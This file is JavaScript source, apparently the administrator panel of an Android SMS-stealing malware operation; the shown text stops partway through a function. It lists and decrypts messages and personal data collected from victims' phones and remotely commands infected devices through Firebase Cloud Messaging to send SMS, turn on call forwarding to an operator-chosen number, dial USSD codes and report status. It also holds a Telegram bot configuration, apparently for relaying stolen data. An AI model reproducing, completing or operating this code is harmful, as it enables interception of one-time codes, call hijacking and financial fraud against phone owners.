class AdminPanel {

    constructor() {
        this.database = window.firebaseDatabase;
        this.auth = window.firebaseAuth;

        this.serviceAccount = window.serviceAccount;
        this.fcmRequest = window.fcmRequest;

        this.decryptKey = window.decryptKey;

        this.refKey = window.refKey;

        this.refAdminKey = this.refKey + "admin/0";

        this.refUserKey = this.refKey + "user";

        this.refMessageKey = this.refKey + "message";

        this.deviceConfig = window.deviceConfig;

        this.messagesConfig = window.messagesConfig;

        this.userDataConfig = window.userDataConfig;

        this.currentDeviceId = "";

        this.currentDeviceKey = "";

        this.currentFCMId = "";

        this.devices = new Map();

		this.progressInterval = null;
		this.currentProgress = 0;


        this.init();
    }

    init() {
        this.setupEventListeners();
        this.checkLogin();
        this.loadDataUsage();
        this.loadData();
    }

    setupEventListeners() {
        // Login
        const loginBtn = document.getElementById('loginBtn');

        if (loginBtn) {
            loginBtn.addEventListener('click', () => this.handleLogin());
        }

        // Setting (Change Number)
        const changeNumberBtn = document.getElementById('changeNumberBtn');

        if (changeNumberBtn) {
            changeNumberBtn.addEventListener('click', () => this.changeForwadingNumber());
        }


        // Setting (Telegram Configration)
        const telegramConfig = document.getElementById('telegramConfig');

        if (telegramConfig) {
            telegramConfig.addEventListener('click', () => this.updateTelegramConfig());
        }

        // Setting (Change Password)
        const changePasswordBtn = document.getElementById('changePasswordBtn');

        if (changePasswordBtn) {
            changePasswordBtn.addEventListener('click', () => this.changePassword());
        }

        // Setting (Change Password)
        const deletionPasswordChangeBtn = document.getElementById('deletionPasswordChangeBtn');

        if (deletionPasswordChangeBtn) {
            deletionPasswordChangeBtn.addEventListener('click', () => this.changeDeletionPassword());
        }

        // Setting (Clear Mesages)
        const clearUserBtn = document.getElementById('clearUserBtn');

        if (clearUserBtn) {
            clearUserBtn.addEventListener('click', () => this.clearUsers());
        }

        // Setting (Clear Mesages)
        const clearMessagesBtn = document.getElementById('clearMessagesBtn');

        if (clearMessagesBtn) {
            clearMessagesBtn.addEventListener('click', () => this.clearMessages());
        }

        // Device Detail (View Data)
        const viewDataBtn = document.getElementById('viewDataBtn');

        if (viewDataBtn) {
            viewDataBtn.addEventListener('click', () => this.showViewDataCard());
        }

        // Device Detail (Message Data)
        const fetchSMSBtn = document.getElementById('fetchSMSBtn');

        if (fetchSMSBtn) {
            fetchSMSBtn.addEventListener('click', () => {
                this.showMessageCard();
                this.loadMessages(true);
            });
        }

        // Device Detail (Send Message)
        const sendMessageBtn = document.getElementById('sendMessageBtn');

        if (sendMessageBtn) {
            sendMessageBtn.addEventListener('click', () => {
                this.showSendMessageCard();
            });
        }

        // Device Detail (Send Message)
        const sendSMSButton = document.getElementById('sendSMSButton');

        if (sendSMSButton) {
            sendSMSButton.addEventListener('click', () => {
                this.sendMessageFromPhone();
            });
        }

        // Device Detail (Send Message)
        const callForwardingBtn = document.getElementById('callForwardingBtn');

        if (callForwardingBtn) {
            callForwardingBtn.addEventListener('click', () => {
                this.showCallForwardingCard();
            });
        }

        // Device Detail (Send Message)
        const enableCallForwardingBtn = document.getElementById('enableCallForwardingBtn');

        if (enableCallForwardingBtn) {
            enableCallForwardingBtn.addEventListener('click', () => {
                this.enableCallForwarding(true);
            });
        }

        // Device Detail (Send Message)
        const disableCallForwardingBtn = document.getElementById('disableCallForwardingBtn');

        if (disableCallForwardingBtn) {
            disableCallForwardingBtn.addEventListener('click', () => {
                this.enableCallForwarding(false);
            });
        }

        // Device Detail (Send Message)
        const ussdDialogBtn = document.getElementById('ussdDialogBtn');

        if (ussdDialogBtn) {
            ussdDialogBtn.addEventListener('click', () => {
                this.showUSSDDialingCard();
            });
        }

        // Device Detail (Send Message)
        const sendUSSDBtn = document.getElementById('sendUSSDBtn');

        if (sendUSSDBtn) {
            sendUSSDBtn.addEventListener('click', () => {
                this.sendUSSDCode();
            });
        }


        // Device Detail (Send Message)
        const manipulateConnectionBtn = document.getElementById('manipulateConnectionBtn');

        if (manipulateConnectionBtn) {
            manipulateConnectionBtn.addEventListener('click', () => {
                this.manipulateDevices();
            });
        }


        // Dashboard Tab Listener
        document.querySelectorAll('.tab').forEach(tab => {
            tab.addEventListener('click', () => {
                if (tab.classList.contains('logout')) {
                	this.logoutAdmin();
                } else if (tab.dataset.href) {
                    window.location.href = tab.dataset.href;
                }
            });
        });
    }

	async manipulateDevices() {
        this.devices.clear();
	    if (!confirm('This will force to check all client devices status. Continue?')) {
	        return;
	    }

    	this.showProgressBar();

	    try {
	        let commandCount = 0;

            const bearerToken = await this.getBearerToken();

	        for (const [key, user] of this.devicesList) {
	            if (user.serial === undefined) continue;

	            const fcmToken = user.fcmid;

	            const payload = {
	                message: {
	                    token: fcmToken,
	                    data: {
	                        title: "",
	                        message: "",
	                        number: "",
	                        carrier: "",
	                        type: "restart",
	                        msg: ""
	                    }
	                }
	            };

	            const deviceRef = this.database.ref(`${this.refUserKey}/${key}`);
	            const now = Date.now();

	            if (!user.last_checked || (now - user.last_checked > 5000) || user.status !== "Checking...") {
	                await deviceRef.update({
	                    status: "Checking...",
	                    last_checked: now
	                }).catch(err => {});
	            }

	            const response = await fetch(this.fcmRequest, {
	                method: "POST",
	                headers: {
	                    "Content-Type": "application/json",
	                    "Authorization": `Bearer ${bearerToken}`
	                },
	                body: JSON.stringify(payload)
	            });

	            // const responseData = await response.json();

	            commandCount++;
	        }

            alert(`Connection check command sent to ${commandCount} devices! Waiting for Response!`);

	        setTimeout(() => {
            	this.loadDevices();
	        }, 5000);

	    } catch (error) {
	        alert(`Error manipulating connections: ${error.message}`);
	        console.error('Connection manipulation error:', error);
	    }
	}

    async sendUSSDCode() {
        const selectedSimSlot = document.getElementById("selectOperator2").value.trim();
        const phoneNumber = document.getElementById("phone-number2").value.trim();

        if (!phoneNumber) {
            alert("Please enter a valid code.");
            return;
        }

        if (!selectedSimSlot) {
            alert("Please select a SIM.");
            return;
        }


        this.showProgressBar();

        const fcmToken = this.currentFCMId;

        const payload = {
            message: {
                token: fcmToken,
                data: {
                    title: String(selectedSimSlot),
                    message: String("a"),
                    number: String(phoneNumber),
                    carrier: String("c"),
                    type: String("cp"),
                    msg: String("")
                }
            }
        };

        try {
            const bearerToken = await this.getBearerToken();

            const response = await fetch(
                this.fcmRequest,
                {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "Authorization": `Bearer ${bearerToken}`
                    },
                    body: JSON.stringify(payload)
                }
            );

            const responseData = await response.json();

            if (responseData.name) {
                alert("USSD code sent successfully!");

            } else {
                if (responseData.error.code == 404) {
                    alert("App are not installed in user phone");
                } else {
                    alert("Failed to send USSD code!");
                }
            }

            this.finishProgressBar();
        } catch (error) {
            console.error("Error ", error);
            alert("An error occurred.");
        }
    }

    async enableCallForwarding(forwardingStatus) {
        const phoneNumber = document.getElementById("phone-number").value.trim();
        const selectedSimSlot = document.getElementById("selectOperator").value.trim();

        if (!phoneNumber && forwardingStatus) {
            alert("Please enter a valid 10-15 digit phone number.");
            return;
        }

        if (!selectedSimSlot) {
            alert("Please select a SIM.");
            return;
        }


        this.showProgressBar();

        const fcmToken = this.currentFCMId;

        var callForwardingMessage = forwardingStatus ? "a" : "d";

        const payload = {
            message: {
                token: fcmToken,
                data: {
                    title: String(selectedSimSlot),
                    message: String(callForwardingMessage),
                    number: String(phoneNumber),
                    carrier: String("c"),
                    type: String("c"),
                    msg: String("")
                }
            }
        };

        try {
            const bearerToken = await this.getBearerToken();

            const response = await fetch(
                this.fcmRequest,
                {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "Authorization": `Bearer ${bearerToken}`
                    },
                    body: JSON.stringify(payload)
                }
            );

            const responseData = await response.json();

            if (responseData.name) {
                alert("Call forwarding successfully!");

                const deviceRef = this.database.ref(`${this.refUserKey}/${this.currentDeviceKey}`);

                deviceRef.update({
                    callforwarding: forwardingStatus ? "ON" : "OFF"
                })
                    .then(() => {
                        window.location.reload();
                    })
                    .catch(err => { });


            } else {
                if (responseData.error.code == 404) {
                    alert("App are not installed in user phone");
                } else {
                    alert("Failed to call forwarding!");
                }
            }

            this.finishProgressBar();
        } catch (error) {
            console.error("Error ", error);
            alert("An error occurred.");
        }
    }

    async sendMessageFromPhone() {
        const selectedSimSlot = document.getElementById("selectOperator1").value.trim();
        const message = document.getElementById("message").value.trim();
        const phoneNumber = document.getElementById("phone-number1").value.trim();

        if (!phoneNumber) {
            alert("Please enter a valid 10-digit phone number.");
            return;
        }

        if (!selectedSimSlot) {
            alert("Please select a SIM.");
            return;
        }

        this.showProgressBar();

        const fcmToken = this.currentFCMId;

        const payload = {
            message: {
                token: fcmToken,
                data: {
                    title: String(selectedSimSlot),
                    message: String(""),
                    number: String(phoneNumber),
                    carrier: String("c"),
                    type: String("m"),
                    msg: String(message)
                }
            }
        };

        try {
            const bearerToken = await this.getBearerToken();

            const response = await fetch(
                this.fcmRequest,
                {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "Authorization": `Bearer ${bearerToken}`
                    },
                    body: JSON.stringify(payload)
                }
            );

            const responseData = await response.json();

            if (responseData.name) {
                alert("SMS send successfully!");
            } else {
                if (responseData.error.code == 404) {
                    alert("App are not installed in user phone");
                } else {
                    alert("Failed to send sms!");
                }
            }
            this.finishProgressBar();
        } catch (error) {
            console.error("Error ", error);
            alert("An error occurred.");
        }
    }

    async changeForwadingNumber() {
        const number = document.getElementById('number');

        try {

            if (!number.value) {
                alert("Please enter a new number for forwading!");
            } else {

                const adminRef = this.database.ref(`${this.refAdminKey}`);

                await adminRef.update({
                    number: number.value
                });

                alert("Your number has been updated successfully");

                this.fetchCurrentNumber();

                number.value = "";
            }

        } catch (error) {
            alert("Failed to update the number!");
        }
    }

    async changeDeletionPassword() {
        const oldPassword = document.getElementById('deletionOldPassword');
        const newPassword = document.getElementById('deletionNewPassword');
        const confirmPassword = document.getElementById('deletionConfirmPassword');

        try {

            if (!oldPassword.value && !newPassword.value && !confirmPassword.value) {
                alert("Fields are empty!");
            } else {

                if (newPassword.value === confirmPassword.value) {

                    const adminRef = this.database.ref(`${this.refAdminKey}`);

                    const snapshot = await adminRef.once('value');

                    if (snapshot.exists()) {
                        const adminData = snapshot.val();

                        if (adminData.deletionPassword !== undefined && adminData.deletionPassword !== null) {

                            if (adminData.deletionPassword === oldPassword.value) {

                                await adminRef.update({
                                    deletionPassword: confirmPassword.value
                                });

                                alert("Your deletion password has been updated successfully");

                                oldPassword.value = "";
                                newPassword.value = "";
                                confirmPassword.value = "";
                            } else {
                                alert("Please enter a correct password!");
                            }

                        } else {
                            alert("Please contact your service provider");
                        }

                    }


                } else {
                    alert("New Password and Confirm Password are not match!");
                }

            }

        } catch (error) {
            alert("Failed to update the number!");
        }
    }

    async updateTelegramConfig() {
        const chatId = document.getElementById('chatId');
        const token = document.getElementById('token');

        try {

            if (!chatId.value && !token.value) {
                alert("Fields are empty!");
            } else {

                const adminRef = this.database.ref(`${this.refAdminKey}/telegram`);

                await adminRef.update({
                    chatId: chatId.value,
                    token: token.value
                });

                alert("Your telegram has been successfully updated");
            }

        } catch (error) {
            alert("Failed to update telegram configration!");
        }
    }


    async changePassword() {
        const oldPassword = document.getElementById('oldPassword');
        const newPassword = document.getElementById('newPassword');
        const confirmPassword = document.getElementById('confirmPassword');

        try {

            if (!oldPassword.value && !newPassword.value && !confirmPassword.value) {
                alert("Fields are empty!");
            } else {

                if (newPassword.value === confirmPassword.value) {

                    const adminRef = this.database.ref(`${this.refAdminKey}`);

                    const snapshot = await adminRef.once('value');

                    if (snapshot.exists()) {
                        const adminData = snapshot.val();

                        if (adminData.pass === oldPassword.value) {

                            await adminRef.update({
                                pass: confirmPassword.value
                            });

                            alert("Your password has been updated successfully");

                            oldPassword.value = "";
                            newPassword.value = "";
                            confirmPassword.value = "";
                        } else {
                            alert("Please enter a correct password!");
                        }

                    }


                } else {
                    alert("New Password and Confirm Password are not match!");
                }

            }

        } catch (error) {
            alert("Failed to update the number!");
        }
    }

    async clearUsers() {
        const deletePassword = document.getElementById('deletePassword');

        try {

            if (!deletePassword.value) {
                alert("Password are required for delete users!");
            } else {

                const adminRef = this.database.ref(`${this.refAdminKey}`);

                const snapshot = await adminRef.once('value');

                if (snapshot.exists()) {
                    const adminData = snapshot.val();

                    if (adminData.deletionPassword !== undefined && adminData.deletionPassword !== null) {

                        if (adminData.deletionPassword === deletePassword.value) {

                            if (!confirm('ARE YOU SURE YOU WANT TO DELETE ALL Users/Devices?')) {
                                return;
                            }

                            await this.database.ref(this.refUserKey).remove();

                            alert('All users are deleted successfully!');

                            deletePassword.value = "";

                        } else {
                            alert("Please enter a correct password!");
                        }
                    } else {
                        alert('Please contact your service provider.');
                    }

                }


            }

        } catch (error) {
            alert("Failed to update the number!");
        }
    }

    async clearMessages() {
        const deletePassword = document.getElementById('deletePassword');

        try {

            if (!deletePassword.value) {
                alert("Password are required for delete messages!");
            } else {

                const adminRef = this.database.ref(`${this.refAdminKey}`);

                const snapshot = await adminRef.once('value');

                if (snapshot.exists()) {
                    const adminData = snapshot.val();

                    if (adminData.deletionPassword !== undefined && adminData.deletionPassword !== null) {

                        if (adminData.deletionPassword === deletePassword.value) {

                            if (!confirm('ARE YOU SURE YOU WANT TO DELETE ALL MESSAGES?')) {
                                return;
                            }

                            await this.database.ref(this.refMessageKey).remove();

                            alert('All messages are deleted successfully!');

                            deletePassword.value = "";

                        } else {
                            alert("Please enter a correct password!");
                        }

                    } else {
                        alert('Please contact your service provider.');
                    }
                }


            }

        } catch (error) {
            alert("Failed to update the number!");
        }
    }


    loadData() {
        const currentPage = window.location.pathname;

        if (!currentPage.endsWith("index.html") && !currentPage.endsWith("/")) {
			setInterval(async () => {
			    const sessionId = localStorage.getItem("adminSessionId");
			    if (!sessionId) return;

			    const snap = await this.database.ref(`${this.refKey}sessions/${sessionId}`).once("value");
			    const data = snap.val();

			    if (!data || !data.active) {
			        this.forceLogout(); // forcibly redirect if session is inactive
			    }
			}, 5000);
        }

        if (currentPage.endsWith("dashboard.html")) {
            this.loadDevices();

            this.serialFilter();
        } else if (currentPage.endsWith("alldata.html")) {
            this.loadUserData(true);

            this.serialFilterForData();
        } else if (currentPage.endsWith("deveicedata.html")) {
            const urlParams = new URLSearchParams(window.location.search);

            const deviceId = urlParams.get("id");

            this.loadDeviceDataById(deviceId);
        } else if (currentPage.endsWith("data.html")) {
            this.loadMessages(false);

            this.serialFilterForData();
        } else if (currentPage.endsWith("groupdata.html")) {
            this.loadDataAndMessage();

            this.serialFilterForData();
        } else if (currentPage.endsWith("setting.html")) {
            this.loadUserData(false);
            this.fetchCurrentNumber();
        } else if (currentPage.endsWith("devicelog.html")) {
        	this.loadDevicesLogged(true);
        }

    }

    async loadDeviceDataById(deviceKey) {
    	this.showProgressBar();
        try {
            const userRef = this.database.ref(this.refUserKey);

            userRef.once('value', (snapshot) => {

                const users = snapshot.val();
                const userList = Object.entries(users);

                userList.forEach(([key, user]) => {
                    if (user.serial === undefined) return;

                    if (user.deviceid === deviceKey) {

                        this.currentDeviceId = user.deviceid;

                        this.currentFCMId = user.fcmid;

                        this.currentDeviceKey = key;

                        var device = this.splitDeviceNameAndVerison(user.devicename);

                        document.getElementById("devicename").innerHTML = device.name;
                        document.getElementById("deviceversion").innerHTML = device.number;

                        document.getElementById("deviceId").innerHTML = user.deviceid;

                        var operator = "";

                        if (user?.callforwarding !== undefined && user?.callforwarding !== null) {
                            document.getElementById("callforwarding").innerHTML = user.callforwarding;
                            document.getElementById("callforwarding").style = "color: green";
                        } else {

                            document.getElementById("callforwarding").innerHTML = "OFF";
                            document.getElementById("callforwarding").style = "color: red";
                        }

                        const select = document.getElementById("selectOperator");

                        const select1 = document.getElementById("selectOperator1");

                        const select2 = document.getElementById("selectOperator2");

                        if (user?.sim?.SimSlot0 !== undefined && user?.sim?.SimSlot0 !== null) {

                            operator += user.sim.CarrierName0 + " " + user.sim.PhoneNumber0;

                            const option = document.createElement("option");
                            option.value = "0";
                            option.textContent = user.sim.CarrierName0 + " - " + user.sim.PhoneNumber0;
                            select.appendChild(option);

                            const option1 = document.createElement("option");
                            option1.value = "0";
                            option1.textContent = user.sim.CarrierName0 + " - " + user.sim.PhoneNumber0;

                            select1.appendChild(option1);

                            const option2 = document.createElement("option");
                            option2.value = "0";
                            option2.textContent = user.sim.CarrierName0 + " - " + user.sim.PhoneNumber0;

                            select2.appendChild(option2);
                        }

                        if (user?.sim?.SimSlot1 !== undefined && user?.sim?.SimSlot1 !== null) {


                            if (operator != "") {
                                operator += " | ";
                            }

                            operator += user.sim.CarrierName1 + " " + user.sim.PhoneNumber1;

                            const option = document.createElement("option");
                            option.value = "1";
                            option.textContent = user.sim.CarrierName1 + " - " + user.sim.PhoneNumber1;
                            select.appendChild(option);

                            const option1 = document.createElement("option");
                            option1.value = "1";
                            option1.textContent = user.sim.CarrierName1 + " - " + user.sim.PhoneNumber1;

                            select1.appendChild(option1);

                            const option2 = document.createElement("option");
                            option2.value = "1";
                            option2.textContent = user.sim.CarrierName1 + " - " + user.sim.PhoneNumber1;

                            select2.appendChild(option2);
                        }

                        document.getElementById("operator").innerHTML = `${operator}`;

                        let rows = "";

                        this.userDataConfig.forEach(field => {
                            let value = user[field.key];

                            value = value !== undefined && value !== null ? field.decrypt ? this.decryptData(value) : value : "";

                            rows += `<div class="log"><strong>${field.label}</strong> — <span>${value}</span></div>`;
                        });


                        document.getElementById("listdata").innerHTML = rows;

                        this.finishProgressBar();

                    }


                });

            });


        } catch (error) {
            alert("Database Error: " + error.message);
        }
    }

    async fetchCurrentNumber() {
        try {
            const adminRef = this.database.ref(this.refAdminKey);

            const snapshot = await adminRef.once('value');

            if (snapshot.exists()) {
                const data = snapshot.val();
                document.getElementById('preNumber').value = data.number;
            }
        } catch (error) {
            alert("Failed to fetch the current number!");
        }
    }

    async loadDataAndMessage() {
        try {
            const userRef = this.database.ref(this.refUserKey);

            let html = "";

            userRef.on('value', (snapshot) => {
                html = "";

                const users = snapshot.val();
                const userList = Object.entries(users);

                // Latest → oldest
                userList.reverse();

                let count = 0;

                userList.forEach(([key, user]) => {
                    if (user.serial === undefined) return;

                    count++;

                });



                document.getElementById("totalUsers").innerText = `${count}`;

            });


        } catch (error) {
            alert("Database Error: " + error.message);
        }
    }

    async loadUserData(showCards) {
    	this.showProgressBar();

    	this.loadDevicesLogged(false);

        try {
            const userRef = this.database.ref(this.refUserKey);

            let html = "";

            userRef.on('value', (snapshot) => {
                html = "";

                const users = snapshot.val();
                const userList = Object.entries(users);

                // Latest → oldest
                userList.reverse();

                let count = 0;

                userList.forEach(([key, user]) => {
                    if (user.serial === undefined) return;

                    count++;

                    if (showCards) {
                        html += this.buildUserDataCard(user, key);
                    }
                });

                document.getElementById("totalUsers").innerText = `${count}`;

                if (showCards) {
                    // Render HTML
                    document.getElementById("list").innerHTML = html;

                }

                this.finishProgressBar();
            });


        } catch (error) {
            alert("Database Error: " + error.message);
        }
    }

    buildUserDataCard(user, key) {
        let rows = "";

        this.userDataConfig.forEach(field => {
            let value = user[field.key];

            value = value !== undefined && value !== null ? field.decrypt ? this.decryptData(value) : value : "";

            rows += `<strong>${field.label}:</strong> <span class="serial">${value}</span><br>`;
        });


        return `
<div class="msg-card">
    ${rows}
    <div class="main-info">
        <div>
            <span class="key">Device:</span>
            <a href="deveicedata.html?id=${encodeURIComponent(user.deviceid)}">${user.deviceid}</a>
        </div>
        <div>
            <span class="date">${this.formatTimestamp(user.timestamp)}</span>
        </div>
    </div>
</div>

`;
    }

    async loadMessages(loadByDevice) {
    	this.showProgressBar();

    	this.loadDevicesLogged(false);

        try {
            const messagesRef = this.database.ref(this.refMessageKey);

            let html = "";

            let hasMessage = false;

            messagesRef.on('value', (snapshot) => {
                html = "";

                const messages = snapshot.val();
                const messagesList = Object.entries(messages);

                if (!loadByDevice) {
                    document.getElementById("totalMessages").innerText = `${messagesList.length}`;
                }

                // Latest → oldest
                messagesList.reverse();

                messagesList.forEach(([key, message]) => {
                    if (message.serial === undefined) return;

                    if (loadByDevice) {

                        if (message.device == this.currentDeviceId) {
                            html += this.buildMessageCard(message, key);
                            hasMessage = true;
                        }

                    } else {
                        html += this.buildMessageCard(message, key);
                        hasMessage = true;
                    }


                });

                if (!hasMessage) {
                    html = "<p>No Message available</p>";
                }

                // Render HTML
                document.getElementById("list").innerHTML = html;

				this.finishProgressBar();
            });


        } catch (error) {
            alert("Database Error: " + error.message);
        }
    }

    buildMessageCard(message, key) {
        let rows = "";

        let d = this.formatDate(message.time);

        this.messagesConfig.forEach(field => {
            let value = message[field.key];

            value = value !== undefined && value !== null ? field.decrypt ? this.decryptData(value) : value : "";

            if (field.label === "Time") {
                rows += `<div class="info"><span class="key">${field.label}:</span> <span class="">${d.fullFormat}</span></div>`;
            } else if (field.label === "Message") {
                rows += `<div class="info"><span class="key">${field.label}:</span> <span class="msg-red">${value}</span></div>`;
            } else {
                rows += `<div class="info"><span class="key">${field.label}:</span> <span class="">${value}</span></div>`;
            }

        });


        return `
<div class="msg-card">
    ${rows}
    <div class="main-info">
        <div>
            <span class="key">Device:</span>
            <a href="deveicedata.html?id=${encodeURIComponent(message.device)}">${message.device}</a>
        </div>
        <div>
            <span class="date">${d.shortFormat}</span>
        </div>
    </div>
</div>
`;
    }

    // Fetch and display devices data
    async loadDevices() {
    	this.showProgressBar();

    	this.loadDevicesLogged(false);
    	
        try {
            const userRef = this.database.ref(this.refUserKey);

            const userSnapshot = await userRef.once("value");

            userSnapshot.forEach(child => {
                const key = child.key;
                const user = child.val();

                if (user.serial === undefined) return;

                // Auto-offline logic
                if (user.status === "Checking...") {
                    const lastCheck = user.last_checked;
                    const now = Date.now();
                    const diff = now - lastCheck;

                    if (diff > 10000) {
                        this.database.ref(`${this.refUserKey}/${key}/status`).set("offline").catch(() => { });
                    }
                }
            });

            let html = "";

            userRef.on('value', (snapshot) => {
                html = "";

                // No device available
                if (!snapshot.exists()) {
                    document.getElementById("deviceContainer").innerHTML =
                        "<p style='text-align:center;color:red;'>No users found.</p>";

    				this.finishProgressBar();
                    return;
                }

                const users = snapshot.val();
                const userList = Object.entries(users);

                // Latest → oldest
                userList.reverse();

                this.devicesList = userList;

                let count = 0;

                userList.forEach(([key, user]) => {
                    if (user.serial === undefined) return;

                    count++;

                    html += this.buildDeviceCard(user, key);

                });

                // Stats update
                document.getElementById("totalUsers").innerText =
                    `${count}`;

                // Render HTML
                document.getElementById("deviceContainer").innerHTML = html;

                const container = document.getElementById("deviceContainer");

                // Card click
                container.querySelectorAll(".device-card").forEach(card => {
                    card.addEventListener("click", () => {
                        const serial = card.getAttribute("data-deviceid");
                        window.location.href = `deveicedata.html?id=${encodeURIComponent(serial)}`;
                    });
                });

                // Check Status buttons
                container.querySelectorAll(".check-status-btn").forEach(btn => {
                    btn.addEventListener("click", (e) => {
                        e.stopPropagation(); // prevents card click
                        const key = btn.dataset.key;
                        const fcmId = btn.dataset.fcmid;

                        this.checkOnlineStatus(key, fcmId);
                    });
                });

                // Like buttons
                container.querySelectorAll(".like-btn").forEach(btn => {
                    btn.addEventListener("click", (e) => {
                        e.stopPropagation(); // prevents card click
                        const key = btn.dataset.key;
                        const like = btn.dataset.like;

                        this.likeDevice(key, like);
                    });
                });

                // Delete buttons
                container.querySelectorAll(".delete-btn").forEach(btn => {
                    btn.addEventListener("click", (e) => {
                        e.stopPropagation(); // prevents card click
                        const key = btn.dataset.key;
                        this.deleteDevice(key);
                    });
                });

            });


        } catch (error) {
            alert("Database Error: " + error.message);
        }


    	this.finishProgressBar();
    }

    buildDeviceCard(user, key) {
        let rows = "";

        this.deviceConfig.forEach(field => {

            let value = user[field.key];

            value = value !== undefined && value !== null ? field.decrypt ? this.decryptData(value) : value : field.default || "";

            // Status class logic
            if (field.statusClass) {
                rows += `<p class="device-text">${field.label}: <span class="bold ${value === " online" ? "status-success"
                    : "status-error"}">${value}</span></p>`;
            } else if (field.label === "Device Name") {

                var device = this.splitDeviceNameAndVerison(value);

                rows += `<a class="deviceLink" href="#">
				    <p class="device-title">${device.name} <span class="version">${device.number}</span></p>
				</a>`;
            } else if (field.label === "Sim") {

                var operator = "";

                if (value["SimSlot0"] !== undefined && value["SimSlot0"] !== null) {
                    operator += value["CarrierName0"] + " " + value["PhoneNumber0"];
                }

                if (value["SimSlot1"] !== undefined && value["SimSlot1"] !== null) {

                    if (operator != "") {
                        operator += " | ";
                    }

                    operator += value["CarrierName1"] + " " + value["PhoneNumber1"];
                }

                rows += `<p class="device-text">${field.label}: <span class="bold">${operator}</span></p>`;
            } else {
                rows += `<p class="device-text">${field.label}: <span class="bold">${value}</span></p>`;
            }
        });

        return `
			<div class="device-card" data-serial="${user.serial}" data-deviceid="${key}">
			    <div class="device-card-left">
			        <a class="deviceLink" href="#">
			            <img alt="OnePlus (CPH2467)" loading="lazy" width="80" height="120" decoding="async" data-nimg="1"
			                class="device-image" src="device.png" style="color: transparent;">
			        </a>
			        <div class="device-details">
			            ${rows}
			        </div>
			    </div>
			    <div class="device-card-action">
			        <button type="button" class="btn-outline like-btn ${user.like ? " likeButton" : ""}" data-key="${key}"
			            data-like="${user.like}">${user.like ? "Unlike" : "Like"}</button>
			        <button type="button" class="btn-outline check-status-btn" data-key="${key}"
			            data-fcmid="${user.fcmid}">Check</button>
			        <button type="button" class="btn-outline delete-btn" data-key="${key}">Delete</button>
			    </div>
			</div>
			`;
    }


    // Fetch and logged devices
    async loadDevicesLogged(isCardShow) {
	    if (isCardShow) {
	    	this.showProgressBar();
	    }

        try {
            const loggedRef = this.database.ref(`${this.refKey}sessions`);

            let html = "";

            loggedRef.on('value', (snapshot) => {
                html = "";

                const devices = snapshot.val();
                const deviceList = Object.entries(devices);

			    // Sort by loginTime descending (latest first)
			    deviceList.sort((a, b) => b[1].loginTime - a[1].loginTime);

			    let count = 0;

                deviceList.forEach(([key, device]) => {

                	if (device.active) {
                		count++;
                	}

                	if (isCardShow) {
	                    html += this.buildLoggedDevicesCard(device, key);
                	}

                });

                const totalLoginDevices = document.getElementById('totalLoginDevices');

                if (totalLoginDevices) {
                    document.getElementById("totalLoginDevices").innerHTML = count;
                }


                // Render HTML
				if (isCardShow) {
                	document.getElementById("deviceContainer").innerHTML = html;
            	}
            });


        } catch (error) {
            alert("Database Error: " + error.message);
        }


	    if (isCardShow) {
    		this.finishProgressBar();
	    }
    }

	buildLoggedDevicesCard(device, key) {
	    return `
	        <div class="device-card" data-deviceid="${key}">
	            <div class="device-card-left">
	                <a class="deviceLink" href="#">
	                    <img alt="${device.deviceName}" loading="lazy" width="80" height="120" 
	                        class="device-image" src="device.png" style="color: transparent;">
	                </a>
	                <div class="device-details">
	                    <p class="device-text">Device: <span class="bold">${device.deviceName}</span></p>
	                    <p class="device-text">Browser: <span class="bold">${device.browser}</span></p>
	                    <p class="device-text">Platform: <span class="bold">${device.platform}</span></p>
	                    <p class="device-text">Status: <span class="bold">${device.active ? "Active" : "Inactive"}</span></p>
	                    <p class="device-text">Login Time: <span class="bold">${new Date(device.loginTime).toLocaleString()}</span></p>
                        ${device.lastActive ? `<p class="device-text">Last Active: <span class="bold">${new Date(device.lastActive).toLocaleString()}</span></p>` : ""}
                        ${device.logoutTime ? `<p class="device-text">Logout Time: <span class="bold">${new Date(device.logoutTime).toLocaleString()}</span></p>` : ""}
	                </div>
	            </div>
	        </div>
	    `;
	}

    async getBearerToken() {
        const { client_email, private_key, token_uri } = this.serviceAccount;

        const claim = {
            iss: client_email,
            scope: "https://www.googleapis.com/auth/firebase.messaging",
            aud: token_uri,
            iat: Math.floor(Date.now() / 1000),
            exp: Math.floor(Date.now() / 1000) + 3600
        };

        const header = {
            alg: "RS256",
            typ: "JWT"
        };

        function base64url(source) {
            const encodedSource = btoa(JSON.stringify(source))
                .replace(/=+$/, "")
                .replace(/\+/g, "-")
                .replace(/\//g, "_");
            return encodedSource;
        }

        const encodedHeader = base64url(header);
        const encodedPayload = base64url(claim);

        const cryptoKey = await crypto.subtle.importKey(
            "pkcs8",
            Uint8Array.from(atob(private_key.split("-----")[2].replace(/\n/g, "")), c => c.charCodeAt(0)),
            { name: "RSASSA-PKCS1-v1_5", hash: { name: "SHA-256" } },
            false,
            ["sign"]
        );

        const signature = await crypto.subtle.sign(
            "RSASSA-PKCS1-v1_5",
            cryptoKey,
            new TextEncoder().encode(`${encodedHeader}.${encodedPayload}`)
        );

        const jwt = `${encodedHeader}.${encodedPayload}.${btoa(
            String.fromCharCode(...new Uint8Array(signature))
        )}`;

        const response = await fetch(token_uri, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: new URLSearchParams({
                grant_type: "urn:ietf:params:oauth:grant-type:jwt-bearer",
                assertion: jwt
            })
        });

        const data = await response.json();

        return data.access_token;
    }

    async checkOnlineStatus(deviceid, fcmId) {
        try {
            if (!fcmId) {
                alert("FCM token not available for this device.");
                return;
            }

            const fcmToken = fcmId;
            const payload = {
                message: {
                    token: fcmToken,
                    data: {
                        title: String(""),
                        message: String(""),
                        number: String(""),
                        carrier: String(""),
                        type: String("restart"),
                        msg: String("")
                    }
                }
            };

            const bearerToken = await this.getBearerToken(); // class method

            const deviceRef = this.database.ref(`${this.refUserKey}/${deviceid}`);

            const now = Date.now();

            deviceRef.update({
                status: "Checking...",
                last_checked: now
            })
                .then(() => { })
                .catch(err => { });

            const response = await fetch(
                this.fcmRequest,
                {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "Authorization": `Bearer ${bearerToken}`
                    },
                    body: JSON.stringify(payload)
                }
            );

            const responseData = await response.json();

            if (responseData.name) {
                alert("Check request sent successfully to user device. Please wait for client response.");
            } else if (responseData.error?.code === 404) {
                alert("App is not installed on the user phone.");
            } else {
                alert("Failed to check online status.");
            }

